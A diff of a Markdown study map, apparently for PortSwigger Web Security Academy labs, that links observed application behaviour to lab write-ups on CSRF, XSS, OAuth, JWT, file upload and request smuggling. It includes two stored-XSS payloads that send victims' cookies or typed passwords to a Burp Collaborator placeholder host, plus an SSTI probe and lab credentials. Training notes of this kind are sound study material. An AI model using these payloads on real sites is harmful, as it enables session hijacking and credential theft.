@@ -2,133 +2,133 @@
 #### No Comments
 ##### GraphQL
 - "mutation"
-	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.4.%20Lab%20Bypassing%20GraphQL%20brute%20force%20protections%20%E2%AD%95%EF%B8%8F)
-	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.5.%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQL%20%E2%AD%95%EF%B8%8F)
+	- [[GraphQL Endpoints#2.4. Lab Bypassing GraphQL brute force protections ⭕️]]
+	- [[GraphQL Endpoints#2.5. Lab Performing CSRF exploits over GraphQL ⭕️]]
 
 
 #### Only Comment Field in Blog
 ##### Change Preferred Name
 - `}}{{7*7}}` on `blog-post-author-display` param in `POST` request
 	- Tornado
-		- [SSTI](SSTI.md#3.2.%20Lab%20Basic%20server-side%20template%20injection%20%28code%20context%29%20%E2%AD%95%EF%B8%8F)
+		- [[SSTI#3.2. Lab Basic server-side template injection (code context) ⭕️]]
 
 ##### Change Email + Upload Avatar + Delete account button
-- [Deserialization](Deserialization.md#3.%20Lab%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization%20%E2%AD%95%EF%B8%8F)
+- [[Deserialization#3. Lab Using application functionality to exploit insecure deserialization ⭕️]]
 
 #### Every field
 ##### My account
 - "We are now redirecting you to login with social media..."
-	- [CSRF](CSRF.md#2.10.%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%E2%AD%95%EF%B8%8F)
+	- [[CSRF#2.10. Lab SameSite Lax bypass via cookie refresh ⭕️]]
 	- No features (no change email, etc.)
 		- `POST /authenticate`
-			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.1.%20Lab%20Authentication%20bypass%20via%20OAuth%20implicit%20flow%20%E2%AD%95%EF%B8%8F)
+			- [[OAuth Authentication#1/2.1. Lab Authentication bypass via OAuth implicit flow ⭕️]]
 			- "Next post" button on blogs
-				- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.5.%20Lab%20Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect%20%E2%AD%95%EF%B8%8F)
+				- [[OAuth Authentication#1/2.5. Lab Stealing OAuth access tokens via an open redirect ⭕️]]
 		- *NO* `POST /authenticate`
-			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.2.%20Lab%20SSRF%20via%20OpenID%20dynamic%20client%20registration%20%E2%AD%95%EF%B8%8F)
-			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.4.%20Lab%20OAuth%20account%20hijacking%20via%20redirect_uri%20%E2%AD%95%EF%B8%8F)
+			- [[OAuth Authentication#1/2.2. Lab SSRF via OpenID dynamic client registration ⭕️]]
+			- [[OAuth Authentication#1/2.4. Lab OAuth account hijacking via redirect_uri ⭕️]]
 - Login with social media button
 	- Social media creds: `peter.wiener:hotdog`
-		- [CSRF](CSRF.md#2.x.%20Lab%20Forced%20OAuth%20profile%20linking%20%E2%AD%95%EF%B8%8F)
+		- [[CSRF#2.x. Lab Forced OAuth profile linking ⭕️]]
 
 
 ##### Forgot password?
 - `Host` to `example.com`
 	- 200 OK
-		- [Host Headers](Host%20Headers.md#1.1%20Lab%20Basic%20password%20reset%20poisoning%20%E2%AD%95%EF%B8%8F)
+		- [[Host Headers#1.1 Lab Basic password reset poisoning ⭕️]]
 	- 421 Misdirected Request
-		- [Host Headers](Host%20Headers.md#1.11%20Lab%20Password%20reset%20poisoning%20via%20middleware%20%E2%AD%95%EF%B8%8F)
+		- [[Host Headers#1.11 Lab Password reset poisoning via middleware ⭕️]]
 - `username` in `POST /forgot-password`
-	- [Password Reset](Password%20Reset.md#2.5.%20Lab%20Exploiting%20time-sensitive%20vulnerabilities%20%E2%AD%95%EF%B8%8F)
+	- [[Password Reset#2.5. Lab Exploiting time-sensitive vulnerabilities ⭕️]]
 	- `temp-forgot-password-token`
-		- [Password Reset](Password%20Reset.md#2.3.%20Lab%20Password%20reset%20broken%20logic%20%E2%AD%95%EF%B8%8F)
+		- [[Password Reset#2.3. Lab Password reset broken logic ⭕️]]
 
 ##### Asks for 4-digit security code
-- [Authentication](Authentication.md#1.2.%20Lab%202FA%20simple%20bypass%20%E2%AD%95%EF%B8%8F)
+- [[Authentication#1.2. Lab 2FA simple bypass ⭕️]]
 - `verify` cookie 
-	- [Authentication](Authentication.md#1.8.%20Lab%202FA%20broken%20logic%20%E2%AD%95%EF%B8%8F)
+	- [[Authentication#1.8. Lab 2FA broken logic ⭕️]]
 
 ##### Login Attempt: `wiener:peter`
 - "Invalid username or password."
-	- [Authentication](Authentication.md#1.7.%20Lab%20Username%20enumeration%20via%20account%20lock%20%E2%AD%95%EF%B8%8F)
-	- [Brute Force](Brute%20Force.md#1.4.%20Lab%20Username%20enumeration%20via%20subtly%20different%20responses%20%E2%AD%95%EF%B8%8F)
+	- [[Authentication#1.7. Lab Username enumeration via account lock ⭕️]]
+	- [[Brute Force#1.4. Lab Username enumeration via subtly different responses ⭕️]]
 	- "HTML is allowed" in Blog + `x-host`
-		- <sup>Param Miner: Guess headers</sup> [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.4.Lab%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header%20%E2%AD%95%EF%B8%8F)
+		- <sup>Param Miner: Guess headers</sup> [[Web Cache Poisoning#1.4.Lab Targeted web cache poisoning using an unknown header ⭕️]]
 	- **Post Comment**
 		- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
-			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
+			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to steal cookies ⭕️]]
 		- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
-			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords%20%E2%AD%95%EF%B8%8F)
+			- [[Stored XSS#1.x. Lab Exploiting cross-site scripting to capture passwords ⭕️]]
 	- **Use HTTP Request Smuggling payload**
 		- 500 Internal Server Error
-			- [CL](CL.md#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
-			- [Others](Others.md#1.6.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users%27%20requests%20%E2%AD%95%EF%B8%8F)
+			- [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
+			- [[Others#1.6. Lab Exploiting HTTP request smuggling to capture other users' requests ⭕️]]
 - "Invalid username"
-	- [Brute Force](Brute%20Force.md#1.1%20Lab%20Username%20enumeration%20via%20different%20responses%20%E2%AD%95%EF%B8%8F)
+	- [[Brute Force#1.1 Lab Username enumeration via different responses ⭕️]]
 - Admin panel or `/admin` = "Path /admin is blocked"
 	- **Use HTTP Request Smuggling payload**
 		- 400 Bad Request
-			- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
-			- [TE](TE.md#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)
+			- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]
+			- [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]
 
 ##### Stay Logged In Checkbox
-- [Brute Force](Brute%20Force.md#1.9.%20Lab%20Brute-forcing%20a%20stay-logged-in%20cookie%20%E2%AD%95%EF%B8%8F)
+- [[Brute Force#1.9. Lab Brute-forcing a stay-logged-in cookie ⭕️]]
 - No client-side validation for Email field
-	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#2.10.%20Lab%20Authentication%20bypass%20via%20encryption%20oracle%20%E2%AD%95%EF%B8%8F)
+	- [[Business logic vulnerabilities#2.10. Lab Authentication bypass via encryption oracle ⭕️]]
 - Delete account button
-	- [Brute Force](Brute%20Force.md#1.10.%20Lab%20Offline%20password%20cracking%20%E2%AD%95%EF%B8%8F)
+	- [[Brute Force#1.10. Lab Offline password cracking ⭕️]]
 
 ##### Change Email
 - Invalid Login Attempts: `aaa:aaa`
 	- "You have made too many incorrect login attempts. Please try again in X minute(s)."
-		- [Authentication](Authentication.md#1.6.%20Lab%20Broken%20brute-force%20protection%2C%20IP%20block%20%E2%AD%95%EF%B8%8F)
-		- [Brute Force](Brute%20Force.md#1.5.%20Lab%20Username%20enumeration%20via%20response%20timing%20%E2%AD%95%EF%B8%8F)
-		- [Race conditions](Race%20conditions.md#1%2F2.2.%20Lab%20Bypassing%20rate%20limits%20via%20race%20conditions%20%E2%AD%95%EF%B8%8F)
+		- [[Authentication#1.6. Lab Broken brute-force protection, IP block ⭕️]]
+		- [[Brute Force#1.5. Lab Username enumeration via response timing ⭕️]]
+		- [[Race conditions#1/2.2. Lab Bypassing rate limits via race conditions ⭕️]]
 - `/my-account?id={GUID}`
-	- [Access Control](Access%20Control.md#2.6.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs%20%E2%AD%95%EF%B8%8F)
+	- [[Access Control#2.6. Lab User ID controlled by request parameter, with unpredictable user IDs ⭕️]]
 - `POST /my-account/change-email`
 	- No `csrf` token
-		- [CSRF](CSRF.md#2.1.%20Lab%20CSRF%20vulnerability%20with%20no%20defenses%20%E2%AD%95%EF%B8%8F)
-		- [CSRF](CSRF.md#2.7.%20Lab%20SameSite%20Lax%20bypass%20via%20method%20override%20%E2%AD%95%EF%B8%8F)
+		- [[CSRF#2.1. Lab CSRF vulnerability with no defenses ⭕️]]
+		- [[CSRF#2.7. Lab SameSite Lax bypass via method override ⭕️]]
 		- `SameSite=None`
-			- [CSRF](CSRF.md#2.11.%20Lab%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present%20%E2%AD%95%EF%B8%8F)
-			- [CSRF](CSRF.md#2.12.%20Lab%20CSRF%20with%20broken%20Referer%20validation%20%E2%AD%95%EF%B8%8F)
+			- [[CSRF#2.11. Lab CSRF where Referer validation depends on header being present ⭕️]]
+			- [[CSRF#2.12. Lab CSRF with broken Referer validation ⭕️]]
 		- `SameSite=Strict`
-			- [CSRF](CSRF.md#2.8.%20Lab%20SameSite%20Strict%20bypass%20via%20client-side%20redirect%20%E2%AD%95%EF%B8%8F)
+			- [[CSRF#2.8. Lab SameSite Strict bypass via client-side redirect ⭕️]]
 	- Yes `csrf` token 
 		- Content-Security-Policy
-			- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack%20%E2%AD%95%EF%B8%8F)
+			- [[Reflected XSS#1.x. Lab Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️]]
 		- Remove `csrf` token
 			- 302 Found
-				- [CSRF](CSRF.md#2.2.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20request%20method%20%E2%AD%95%EF%B8%8F)
-				- [CSRF](CSRF.md#2.3.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present%20%E2%AD%95%EF%B8%8F)
+				- [[CSRF#2.2. Lab CSRF where token validation depends on request method ⭕️]]
+				- [[CSRF#2.3. Lab CSRF where token validation depends on token being present ⭕️]]
 			- 400 Bad Request: "Missing parameter 'csrf'"
-				- [CSRF](CSRF.md#2.4.%20Lab%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session%20%E2%AD%95%EF%B8%8F)
-				- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%20%E2%AD%95%EF%B8%8F)
-				- [Clickjacking](Clickjacking.md#1%2F2.2.%20Lab%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter%20%E2%AD%95%EF%B8%8F)
-				- [Clickjacking](Clickjacking.md#1%2F2.3.%20Lab%20Clickjacking%20with%20a%20frame%20buster%20script%20%E2%AD%95%EF%B8%8F)
+				- [[CSRF#2.4. Lab CSRF where token is not tied to user session ⭕️]]
+				- [[Stored XSS#1.x. Lab Exploiting XSS to bypass CSRF defenses ⭕️]]
+				- [[Clickjacking#1/2.2. Lab Clickjacking with form input data prefilled from a URL parameter ⭕️]]
+				- [[Clickjacking#1/2.3. Lab Clickjacking with a frame buster script ⭕️]]
 - "Your API Key is: ..."
-	- [Web cache deception](Web%20cache%20deception.md#1%2F2.1.%20Lab%20Exploiting%20path%20mapping%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
+	- [[Web cache deception#1/2.1. Lab Exploiting path mapping for web cache deception ⭕️]]
 	- `Server: Apache-Coyote/1.1`
-		- [Web cache deception](Web%20cache%20deception.md#1%2F2.2.%20Lab%20Exploiting%20path%20delimiters%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
+		- [[Web cache deception#1/2.2. Lab Exploiting path delimiters for web cache deception ⭕️]]
 	- Cache headers (`X-Cache`, `Age`, etc) only in `/resources`
 		- Adding `.js` in `GET /my-account/aaa.js` doesn't reveal cache headers
-			- [Web cache deception](Web%20cache%20deception.md#1%2F2.3.%20Lab%20Exploiting%20origin%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
-			- [Web cache deception](Web%20cache%20deception.md#1%2F2.4.%20Lab%20Exploiting%20cache%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
+			- [[Web cache deception#1/2.3. Lab Exploiting origin server normalization for web cache deception ⭕️]]
+			- [[Web cache deception#1/2.4. Lab Exploiting cache server normalization for web cache deception ⭕️]]
 
 ##### Change Email + Delete Account
 - `csrf` token
 	- remove `csrf` token == 400 Bad Request
-		- [Clickjacking](Clickjacking.md#1%2F2.1.%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protection%20%E2%AD%95%EF%B8%8F)
-		- [Clickjacking](Clickjacking.md#1%2F2.5.%20Lab%20Multistep%20clickjacking%20%E2%AD%95%EF%B8%8F)
+		- [[Clickjacking#1/2.1. Lab Basic clickjacking with CSRF token protection ⭕️]]
+		- [[Clickjacking#1/2.5. Lab Multistep clickjacking ⭕️]]
 
 
 ##### Change Password + Change Email
 - Remove `current-password`
 	- 200 OK
-		- [Password Reset](Password%20Reset.md#2.7.%20Lab%20Weak%20isolation%20on%20dual-use%20endpoint%20%E2%AD%95%EF%B8%8F)
+		- [[Password Reset#2.7. Lab Weak isolation on dual-use endpoint ⭕️]]
 	- 400 Bad Request: "Missing parameter"
-		- [Password Reset](Password%20Reset.md#1.12.%20Lab%20Password%20brute-force%20via%20password%20change%20%E2%AD%95%EF%B8%8F)
+		- [[Password Reset#1.12. Lab Password brute-force via password change ⭕️]]
 
 
 #### Every field + File Upload in Blog
@@ -136,28 +136,28 @@
 - After uploading `.php` file
 	- `GET /.../{FILE}.php`
 		- 200 OK
-			- [File Uploads](File%20Uploads.md#3.1.%20Lab%20Remote%20code%20execution%20via%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)
-			- [File Uploads](File%20Uploads.md#3.3.%20Lab%20Web%20shell%20upload%20via%20path%20traversal%20%E2%AD%95%EF%B8%8F)
+			- [[File Uploads#3.1. Lab Remote code execution via web shell upload ⭕️]]
+			- [[File Uploads#3.3. Lab Web shell upload via path traversal ⭕️]]
 		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
-			- [File Uploads](File%20Uploads.md#3.2.%20Lab%20Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass%20%E2%AD%95%EF%B8%8F)
+			- [[File Uploads#3.2. Lab Web shell upload via Content-Type restriction bypass ⭕️]]
 	- `POST /my-account/avatar`
 		- "Sorry, php files are not allowed"
-			- [File Uploads](File%20Uploads.md#3.4.%20Lab%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass%20%E2%AD%95%EF%B8%8F)
+			- [[File Uploads#3.4. Lab Web shell upload via extension blacklist bypass ⭕️]]
 		- "Sorry, only JPY & PNG files are allowed"
-			- [File Uploads](File%20Uploads.md#3.5.%20Lab%20Web%20shell%20upload%20via%20obfuscated%20file%20extension%20%E2%AD%95%EF%B8%8F)
+			- [[File Uploads#3.5. Lab Web shell upload via obfuscated file extension ⭕️]]
 		- "Error: file is not a valid image"
-			- [File Uploads](File%20Uploads.md#3.6.%20Lab%20Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)
+			- [[File Uploads#3.6. Lab Remote code execution via polyglot web shell upload ⭕️]]
 
 #### Search Bar
 ##### `/admin`
 - "Admin interface only available if logged in as an administrator"
 	- JWT
-		- <sup>Scan result: YES</sup>[JWT](JWT.md#2.1.%20Lab%20JWT%20authentication%20bypass%20via%20unverified%20signature%20%E2%AD%95%EF%B8%8F)
-		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.2.%20Lab%20JWT%20authentication%20bypass%20via%20flawed%20signature%20verification%20%E2%AD%95%EF%B8%8F)
-		- <sup>JWT is smaller</sup> [JWT](JWT.md#2.3.%20Lab%20JWT%20authentication%20bypass%20via%20weak%20signing%20key%20%E2%AD%95%EF%B8%8F)
-		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.4.%20Lab%20JWT%20authentication%20bypass%20via%20jwk%20header%20injection%20%E2%AD%95%EF%B8%8F)
-		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.5.%20Lab%20JWT%20authentication%20bypass%20via%20jku%20header%20injection%20%E2%AD%95%EF%B8%8F)
-		- [JWT](JWT.md#2.6.%20Lab%20JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal%20%E2%AD%95%EF%B8%8F)
+		- <sup>Scan result: YES</sup>[[JWT#2.1. Lab JWT authentication bypass via unverified signature ⭕️]]
+		- <sup>Scan result: YES</sup> [[JWT#2.2. Lab JWT authentication bypass via flawed signature verification ⭕️]]
+		- <sup>JWT is smaller</sup> [[JWT#2.3. Lab JWT authentication bypass via weak signing key ⭕️]]
+		- <sup>Scan result: YES</sup> [[JWT#2.4. Lab JWT authentication bypass via jwk header injection ⭕️]]
+		- <sup>Scan result: YES</sup> [[JWT#2.5. Lab JWT authentication bypass via jku header injection ⭕️]]
+		- [[JWT#2.6. Lab JWT authentication bypass via kid header path traversal ⭕️]]
 
 ##### Change Email
 - `POST /my-account/change-email`
@@ -167,35 +167,35 @@
 		- Remove `csrf` token
 			- 400 Bad Request: 
 				- "Invalid CSRF token"
-					- [CSRF](CSRF.md#2.5.%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie%20%E2%AD%95%EF%B8%8F)
+					- [[CSRF#2.5. Lab CSRF where token is tied to non-session cookie ⭕️]]
 				- "Missing parameter 'csrf'"
-					- [Essential skills](Essential%20skills.md#1%2F2.2.%20Lab%20Scanning%20non-standard%20data%20structures%20%E2%AD%95%EF%B8%8F)
+					- [[Essential skills#1/2.2. Lab Scanning non-standard data structures ⭕️]]
 		- `csrf` cookie
-			- [CSRF](CSRF.md#2.6.%20Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie%20%E2%AD%95%EF%B8%8F)
+			- [[CSRF#2.6. Lab CSRF where token is duplicated in cookie ⭕️]]
 
 ##### Submit Feedback
 - `searchLoggerConfigurable.js`
 	- `config.transport_url`
-		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.1.%20Lab%20Client-side%20prototype%20pollution%20via%20browser%20APIs%20%E2%AD%95%EF%B8%8F)
+		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.1. Lab Client-side prototype pollution via browser APIs ⭕️]]
 - `searchLogger.js`
-	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.2. Lab DOM XSS via client-side prototype pollution ⭕️]]
 - `searchLoggerFiltered.js`
-	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.4.%20Lab%20Client-side%20prototype%20pollution%20via%20flawed%20sanitization%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [[Client side#2.4. Lab Client-side prototype pollution via flawed sanitization ⭕️]]
 - `jquery_3-0-0.js`
-	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)
+	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [[Client side#2.3. Lab DOM XSS via an alternative prototype pollution vector ⭕️]]
 
 
 ##### Use the HTTP Request Smuggling Payload
 - 400 Bad Request -- "Both chunked encoding and content-length were specified"
 	- Cannot login
-		- [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
-		- [HTTP2](HTTP2.md#1.11.%20Lab%20HTTP%2F2%20request%20splitting%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
+		- [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
+		- [[HTTP2#1.11. Lab HTTP/2 request splitting via CRLF injection ⭕️]]
 	- Can login
-		- [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
+		- [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]
 		
 - 500 Internal Server Error -- "Server Error: Communication timed out"
 	- Can login
-		- [Others](Others.md#1.5.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting%20%E2%AD%95%EF%B8%8F)
+		- [[Others#1.5. Lab Exploiting HTTP request smuggling to reveal front-end request rewriting ⭕️]]
 
 
 ---
